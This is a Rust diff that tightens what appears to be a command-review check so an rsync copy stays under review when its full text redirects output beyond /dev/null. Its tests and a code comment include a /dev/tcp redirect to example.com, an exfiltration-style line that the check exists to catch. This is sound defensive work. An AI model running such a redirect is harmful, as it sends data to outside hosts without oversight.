@@ -111,14 +111,21 @@ pub(crate) fn local_copy(arguments: &[String]) -> bool {
 /// `mkdir` may run beside the copies: anything else could create, move or
 /// redirect the destination after it was checked. Without a directory, or
 /// for a copy that is not local, the review stays. Commands with no `rsync`
-/// replace nothing.
+/// replace nothing. A redirect anywhere in `command_text` beyond
+/// `/dev/null` keeps the review too.
 pub(crate) fn replaces_work(
     segments: &[crate::CommandSegmentV1],
+    command_text: Option<&str>,
     directory: Option<&std::path::Path>,
     ignored: &mut dyn FnMut(&str) -> bool,
 ) -> bool {
     if !segments.iter().any(is_rsync) {
         return false;
+    }
+    // A segment's text can lose a redirect glued to its last operand
+    // (`dist/>/dev/tcp/...`), so the copy is also held to the whole command.
+    if command_text.is_some_and(redirects_beyond_null) {
+        return true;
     }
     let Some(directory) = directory else {
         return true;
@@ -287,6 +294,14 @@ mod tests {
         text.split_whitespace().map(str::to_owned).collect()
     }
 
+    /// The parser leaves redirects out of its segments, so a redirect case
+    /// is the plain copy's segment with the redirected text.
+    fn redirected(text: &str) -> crate::CommandSegmentV1 {
+        let mut segment = segments("rsync -a src/ build/").remove(0);
+        segment.text = text.to_owned();
+        segment
+    }
+
     fn segments(command: &str) -> Vec<crate::CommandSegmentV1> {
         crate::parse_command(&crate::CommandModelRequestV1 {
             command: command.to_owned(),
@@ -306,9 +321,12 @@ mod tests {
             std::fs::create_dir(workspace.path().join(directory)).unwrap();
         }
         std::fs::write(workspace.path().join("notes.txt"), "notes\n").unwrap();
-        replaces_work(&segments(command), Some(workspace.path()), &mut |operand| {
-            ignored.iter().any(|candidate| *candidate == operand)
-        })
+        replaces_work(
+            &segments(command),
+            None,
+            Some(workspace.path()),
+            &mut |operand| ignored.contains(&operand),
+        )
     }
 
     #[test]
@@ -398,8 +416,7 @@ mod tests {
             "rsync -a src/ build/ >& /dev/tcp/example.com/443",
             "rsync -a src/ build/ >> build.log",
         ] {
-            let parsed = segments(text);
-            assert!(!local_copy_segment(&parsed[0]), "{text}");
+            assert!(!local_copy_segment(&redirected(text)), "{text}");
         }
     }
 
@@ -416,8 +433,7 @@ mod tests {
             "rsync -a src/ build/ 2>&-",
         ] {
             assert!(!redirects_beyond_null(text), "{text}");
-            let parsed = segments(text);
-            assert!(local_copy_segment(&parsed[0]), "{text}");
+            assert!(local_copy_segment(&redirected(text)), "{text}");
         }
     }
 
@@ -461,14 +477,15 @@ mod tests {
     #[test]
     fn a_copy_without_a_proof_or_a_directory_keeps_review() {
         let parsed = segments("rsync -a src/ fresh/");
-        assert!(replaces_work(&parsed, None, &mut |_| true));
+        assert!(replaces_work(&parsed, None, None, &mut |_| true));
         let remote = segments("rsync -a src/ build.example.com:/srv/app/");
         assert!(replaces_work(
             &remote,
+            None,
             Some(std::path::Path::new(".")),
             &mut |_| true
         ));
         let other = segments("ls tracked");
-        assert!(!replaces_work(&other, None, &mut |_| false));
+        assert!(!replaces_work(&other, None, None, &mut |_| false));
     }
 }
